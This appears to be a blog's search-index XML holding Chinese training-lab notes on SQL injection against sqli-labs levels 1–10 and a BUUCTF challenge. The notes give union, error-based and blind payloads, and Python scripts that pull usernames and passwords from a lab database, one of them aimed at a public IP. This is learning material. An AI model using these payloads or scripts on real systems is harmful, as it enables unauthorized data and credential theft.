<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>&#39;实训记录3&#39;</title>
      <link href="/2025/03/26/shi-xun-ji-lu-3/"/>
      <url>/2025/03/26/shi-xun-ji-lu-3/</url>
      
        <content type="html"><![CDATA[<p>web搭建</p><p>安装小皮面板及phpcms</p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250326151344245.png" alt="image-20250326151344201"></p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250326150756199.png" alt="image-20250326150755978"></p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250326150819832.png" alt="image-20250326150819415"></p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250326151308587.png" alt="image-20250326151308512"></p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250326151255854.png" alt="image-20250326151255778"></p><p>burpsuite抓登录管理员包</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>&#39;实训记录2&#39;</title>
      <link href="/2025/03/25/shi-xun-ji-lu-2/"/>
      <url>/2025/03/25/shi-xun-ji-lu-2/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入漏洞过程记录"><a href="#sql注入漏洞过程记录" class="headerlink" title="sql注入漏洞过程记录"></a>sql注入漏洞过程记录</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250325143725764.png" alt="image-20250325143725664"></p><p>使用联合注入找寻注入点</p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250325143754654.png" alt="image-20250325143754575"></p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250325143916023.png" alt="image-20250325143915816"></p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250325144749936.png" alt="image-20250325144749855"></p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250325145350073.png" alt="image-20250325145349996"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：-1&#x27; union select 1,2,group_concat(username,password) from users  --+</span><br></pre></td></tr></table></figure><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327113226215.png" alt="image-20250327113226028"></p><p>和less-1类似，但是是数字型注入，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;; --+</span><br><span class="line">?id=0 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&quot;security&quot; and table_name=&quot;users&quot; --+</span><br><span class="line">?id=0 union select 1,group_concat(username),group_concat(password) from security.users --+</span><br></pre></td></tr></table></figure><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>首先进行探测</p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327114007867.png" alt="image-20250327114007777"></p><p>发现没有闭合，试着闭合联合注入</p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327114203001.png" alt="image-20250327114202757"></p><p>成功显示，其余步骤和less-2一样,payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username,password) from users --+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327114553871.png" alt="image-20250327114553664"></p><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>探测发现为”)</p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327115650261.png" alt="image-20250327115649991"></p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327115630462.png" alt="image-20250327115630386"></p><p>其余payload和less-3一样</p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327115745312.png" alt="image-20250327115745058"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: id=-1&quot;) union select 1,2,group_concat(username,password) from users --+</span><br></pre></td></tr></table></figure><h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327115958757.png" alt="image-20250327115958516"></p><p>发现只有报错没有回显，报错注入</p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327120056740.png" alt="image-20250327120056474"></p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327121123340.png" alt="image-20250327121123265"></p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327121559502.png" alt="image-20250327121559237"></p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327121642167.png" alt="image-20250327121641937"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">id=1&#x27; and updatexml(0x7e,concat(0x7e,database()),0x7e) --+</span><br><span class="line">id=-1&#x27; and updatexml(0x7e,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)),0x7e) --+</span><br><span class="line">id=-1&#x27; and updatexml(0x7e,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;security&quot; and table_name=&quot;users&quot;)),0x7e) --+</span><br><span class="line">id=-1&#x27; and updatexml(0x7e,concat(0x7e,(select group_concat(username) from users)),0x7e) --+</span><br></pre></td></tr></table></figure><h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p>报错注入和less-5类似，不同点在双引号</p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327121930809.png" alt="image-20250327121930723"></p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327121957339.png" alt="image-20250327121957109"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">id = -1&#x27; and updatexml(0x7e,concat(0x7e,(select group_concat(username) from users)),0x7e) --+</span><br></pre></td></tr></table></figure><h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p>探测发现为中文单引号闭合</p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327122530913.png" alt="image-20250327122530841"></p><p>提示写入文件</p><h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p>根据csdn复现，布尔盲注、脚本攻击等</p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327123109498.png" alt="image-20250327123109343"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database</span>(<span class="params">url</span>):</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 初始化一个空字符串用于存储数据库名</span></span><br><span class="line">    letters = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%^&amp;*&#x27;</span>  <span class="comment"># 包含可能的字符列表</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 循环每个数据库名的字符位置</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):  <span class="comment"># 假设数据库名最长为20个字符</span></span><br><span class="line">        <span class="comment"># 循环尝试每个可能的字符</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> letters:</span><br><span class="line">            <span class="comment"># 构造盲注payload</span></span><br><span class="line">            payload = <span class="string">&quot;1&#x27; AND SUBSTRING((SELECT DATABASE()), %d, 1) = &#x27;%s&#x27;-- &quot;</span> % (i, j)</span><br><span class="line">            <span class="comment"># 发送请求</span></span><br><span class="line">            res = requests.get(url, params=&#123;<span class="string">&quot;id&quot;</span>: payload&#125;)</span><br><span class="line">            <span class="comment"># 检查响应是否包含特定字符串，即数据库名</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="comment"># 找到一个字符后，将其添加到数据库名中</span></span><br><span class="line">                name += j</span><br><span class="line">                <span class="built_in">print</span>(name)  <span class="comment"># 打印当前已获取的数据库名</span></span><br><span class="line">                <span class="keyword">break</span>  <span class="comment"># 跳出当前循环，继续下一个位置的字符</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标URL</span></span><br><span class="line">url = <span class="string">&#x27;http://49.232.171.41/Less-8/&#x27;</span></span><br><span class="line"><span class="comment"># 调用函数获取数据库名</span></span><br><span class="line">db_name = get_database(url)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Database Name:&quot;</span>, db_name)</span><br></pre></td></tr></table></figure><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p>确定是闭合方式为单引号的时间盲注</p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327123726170.png" alt="image-20250327123725961"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">url = <span class="string">&quot;http://49.232.171.41/Less-9/&quot;</span> <span class="comment">#填入url</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    l = <span class="number">33</span></span><br><span class="line">    r =<span class="number">130</span></span><br><span class="line">    mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(l&lt;r):</span><br><span class="line">        <span class="comment">#str = &quot;?id=1&#x27; and if((ascii(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#str = &quot;?id=1&#x27; and if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;.format(i, mid)</span></span><br><span class="line">        <span class="comment">#str = &quot;?id=1&#x27; and if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;.format(i, mid)</span></span><br><span class="line">        <span class="built_in">str</span> = <span class="string">&quot;?id=1&#x27; and if((ascii(substr((select group_concat(username,password) from security.users),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;</span>.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        time1 = datetime.datetime.now()<span class="comment">#获取请求前的时间</span></span><br><span class="line">        html = requests.get(url+<span class="built_in">str</span>)</span><br><span class="line">        time2  = datetime.datetime.now()<span class="comment">#获取请求后的时间</span></span><br><span class="line">        c = (time2-time1).seconds<span class="comment">#两个时间相减得到页面延迟</span></span><br><span class="line">        <span class="built_in">print</span>(url+<span class="built_in">str</span>)</span><br><span class="line">        <span class="keyword">if</span> c &gt;=<span class="number">2</span>:<span class="comment">#因为sleep(2)所以这就是我们比对的依据</span></span><br><span class="line">            l = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">chr</span>(mid)==<span class="string">&quot; &quot;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result = result + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;result: &quot;</span>,result)</span><br></pre></td></tr></table></figure><h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>确定是闭合方式为双引号的时间盲注，对less-9脚本稍作修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">​</span><br><span class="line">​</span><br><span class="line">​</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8077/sql/Less-10/&quot;</span> <span class="comment">#填入url</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    l = <span class="number">33</span></span><br><span class="line">    r =<span class="number">130</span></span><br><span class="line">    mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(l&lt;r):</span><br><span class="line">        <span class="comment">#str = &quot;?id=1\&quot; and if((ascii(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#str = &quot;?id=1\&quot; and if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;.format(i, mid)</span></span><br><span class="line">        <span class="comment">#str = &quot;?id=1\&quot; and if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;.format(i, mid)</span></span><br><span class="line">        <span class="built_in">str</span> = <span class="string">&quot;?id=1\&quot; and if((ascii(substr((select group_concat(username,password) from security.users),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;</span>.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        time1 = datetime.datetime.now()<span class="comment">#获取请求前的时间</span></span><br><span class="line">        html = requests.get(url+<span class="built_in">str</span>)</span><br><span class="line">        time2  = datetime.datetime.now()<span class="comment">#获取请求后的时间</span></span><br><span class="line">        c = (time2-time1).seconds<span class="comment">#两个时间相减得到页面延迟</span></span><br><span class="line">        <span class="built_in">print</span>(url+<span class="built_in">str</span>)</span><br><span class="line">        <span class="keyword">if</span> c &gt;=<span class="number">2</span>:<span class="comment">#因为sleep(2)所以这就是我们比对的依据</span></span><br><span class="line">            l = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">chr</span>(mid)==<span class="string">&quot; &quot;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result = result + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;result: &quot;</span>,result)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>&#39;实训记录1&#39;</title>
      <link href="/2025/03/24/shi-xun-ji-lu-1/"/>
      <url>/2025/03/24/shi-xun-ji-lu-1/</url>
      
        <content type="html"><![CDATA[<ul><li>前言：SQL注入（SQL Injection）是一种常见的攻击手段，攻击者通过在输入字段中插入恶意SQL代码，来操控数据库，从而获取敏感信息、篡改数据，甚至摧毁数据库。本次实验包括数字型注入和字符型注入，是SQL注入攻击中最基础且最常见的形式。通过联合查询（Union Query）合并多个SQL查询结果来获取未授权数据。</li></ul><h1 id="一、Sql注入原理"><a href="#一、Sql注入原理" class="headerlink" title="一、Sql注入原理"></a>一、Sql注入原理</h1><p>SQL 注入就是指 Web  应用程序对用户输入的数据合法性没有过滤或者是判断，攻击者可以在Web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p><h1 id="二、Sql注入产生原因"><a href="#二、Sql注入产生原因" class="headerlink" title="二、Sql注入产生原因"></a>二、Sql注入产生原因</h1><ul><li>传递给后端的<code>参数是可以控制的</code></li><li><code>参数内容会被带入到数据库查询</code></li><li>变量未存在过滤或者过滤不严谨</li></ul><h1 id="三、SQL探测"><a href="#三、SQL探测" class="headerlink" title="三、SQL探测"></a>三、SQL探测</h1><h2 id="一．探测sql注入的存在"><a href="#一．探测sql注入的存在" class="headerlink" title="一．探测sql注入的存在"></a>一．探测sql注入的存在</h2><p>sql注入第一个前置条件</p><ol><li>用户输入的参数是可以控制的 id</li><li>用户的输入id 用单引号进行包裹的 sql语句我们是可以操控–&gt; 这个功能点存在sql注入漏洞</li></ol><p>单双引号去判断 sql注入payload 二开burp的插件</p><p>xiazhu 查看去自动化实现sql注入的探测</p><p>证明sql语句能够成立 and or</p><p>sql注入漏洞利用 -&gt; 能注入出数据</p><p>select  union 联合查询</p><p>页面有sql报错 并且页面有回显</p><p>web漏洞 -&gt; sql注入 -&gt; 联合注入&#x2F;报错注入&#x2F;盲注&#x2F;二次注入&#x2F;堆叠注入&#x2F;宽字节注入…</p><h2 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h2><p>第一步 爆回显位</p><p>-1’ union select 1,2,3–+</p><p>第二步 爆当前的库名</p><p>-1’ union select 1,2,database()–+</p><p>第三步 爆表名</p><p>-1’union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’–+</p><p>第四步 爆列名</p><p>第五步 爆数据</p><p>sql注入利用完成 -&gt; 完整的利用链</p><p>爆出users表下的所有数据</p><h1 id="四、测试"><a href="#四、测试" class="headerlink" title="四、测试"></a>四、测试</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>1’ and ‘1’&#x3D;’1<br>1’ or sleep(5)#<br>联合注入<br>1’ order by 5 #<br>1’ union select 1,2 #<br>1’ union select 1,database() #<br>1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’dvwa’#<br>1’ union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ #<br>1’ union select user,password from users #</p><h2 id="BUUCTF的lovesql题目"><a href="#BUUCTF的lovesql题目" class="headerlink" title="BUUCTF的lovesql题目"></a>BUUCTF的lovesql题目</h2><p>1.登录测试sql语句</p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250325134343318.png" alt="image-20250325134336217"></p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250325134354153.png" alt="image-20250325134354097"></p><h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>SQL注入作为一种经典的Web应用漏洞，依然是攻击者攻击网站和应用程序的常用手段。因此，掌握SQL注入的攻击方法和防护措施显得尤为重要。此外，参加CTF竞赛如BuuCTF中的Lovesql题目，使我对SQL注入有了更深入的了解和实战经验，也锻炼了我们的漏洞挖掘能力。</p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
